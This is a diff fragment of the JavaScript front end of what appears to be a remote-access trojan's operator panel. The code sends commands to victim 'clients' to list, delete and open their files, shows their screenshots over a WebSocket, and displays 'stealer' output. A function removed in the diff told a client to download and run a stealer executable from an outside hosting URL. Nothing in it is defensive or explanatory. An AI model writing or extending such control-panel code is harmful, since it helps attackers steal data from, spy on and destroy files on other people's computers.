-          output.value += `[!!] Upload error: ${error}\n`;
+          status.textContent += `\n[!!] Upload error: ${error}`;
         });
       };
 
@@ -484,34 +996,65 @@
 
       reader.readAsDataURL(file);
     }
-
-
+    
+    // Context menu functions
+    function showContextMenu(x, y) {
+      const menu = document.getElementById("contextMenu");
+      menu.style.left = `${x}px`;
+      menu.style.top = `${y}px`;
+      menu.style.display = "block";
+    }
+    
     function hideContextMenu() {
       document.getElementById("contextMenu").style.display = "none";
     }
-
-    window.onclick = hideContextMenu;
-
-    function stealData() {
-      const statusEl = document.getElementById('stealerStatus');
-      statusEl.textContent = "Starting stealer...";
+    
+    function deleteFile() {
+      hideContextMenu();
+      if (!selectedClient || !rightClickedPath) return;
+      
+      const status = document.getElementById("stealerStatus");
+      status.textContent = `[File] Deleting ${rightClickedPath}...`;
       
       fetch(`/send/${selectedClient}`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          type: "run_stealer",
-          data: "https://panel-agzz.onrender.com/apps/steller.exe"
-        })
-      })
-      .then(() => {
-        statusEl.textContent = "Stealer activated successfully!";
-      })
-      .catch(err => {
-        statusEl.textContent = "Error: " + err.message;
+        body: JSON.stringify({ type: "rm", data: rightClickedPath })
+      }).then(() => {
+        status.textContent += `\n[File] Deleted successfully`;
+        sendLs(currentPath);
       });
     }
-
+    
+    function openFile() {
+      hideContextMenu();
+      if (!selectedClient || !rightClickedPath) return;
+      
+      const status = document.getElementById("stealerStatus");
+      status.textContent = `[File] Opening ${rightClickedPath}...`;
+      
+      fetch(`/send/${selectedClient}`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ type: "open", data: rightClickedPath })
+      }).then(() => {
+        status.textContent += `\n[File] File opened successfully`;
+        sendLs(currentPath);
+      });
+    }
+    
+    function downloadFile() {
+      hideContextMenu();
+      if (!selectedClient || !rightClickedPath) return;
+      
+      const status = document.getElementById("stealerStatus");
+      status.textContent = `[File] Downloading ${rightClickedPath}...`;
+      
+      // This would be implemented with server-side code
+      alert("File download functionality would be implemented server-side");
+    }
+    
+    // WebSocket for real-time updates
     const ws = new WebSocket(`wss://${location.host}/admin`);
     ws.onmessage = (event) => {
       const msg = JSON.parse(event.data);
@@ -519,38 +1062,20 @@
         document.getElementById("screenshot").src = "data:image/jpeg;base64," + msg.data;
       } else if (msg.type === "result") {
         output.value += `[<- ${selectedClient}] ${msg.data}\n`;
+        output.scrollTop = output.scrollHeight;
       } else if (msg.type === "explorer") {
         renderExplorer(JSON.parse(msg.data));
       } else if (msg.type === "stealer") {
         document.getElementById("stealerData").textContent = msg.data;
+        downloadBtn.style.display = 'block';
       }
     };
-
+    
+    // Initialize when page loads
+    window.onload = initUI;
+    
+    // Periodically load clients
     setInterval(loadClients, 5000);
-    loadClients();
-
-    const themeToggle = document.getElementById("themeToggle");
-
-    function applyTheme(isDark) {
-      document.body.classList.toggle("dark", isDark);
-      themeToggle.textContent = isDark ? "☀️" : "🌙";
-      localStorage.setItem("theme", isDark ? "dark" : "light");
-    }
-
-    const savedTheme = localStorage.getItem("theme");
-    applyTheme(savedTheme === "dark");
-
-    themeToggle.onclick = () => {
-      const isDark = !document.body.classList.contains("dark");
-      applyTheme(isDark);
-    };
-
-    function showContextMenu(x, y) {
-      const menu = document.getElementById("contextMenu");
-      menu.style.left = x + "px";
-      menu.style.top = y + "px";
-      menu.style.display = "block";
-    }
   </script>
 </body>
 </html>
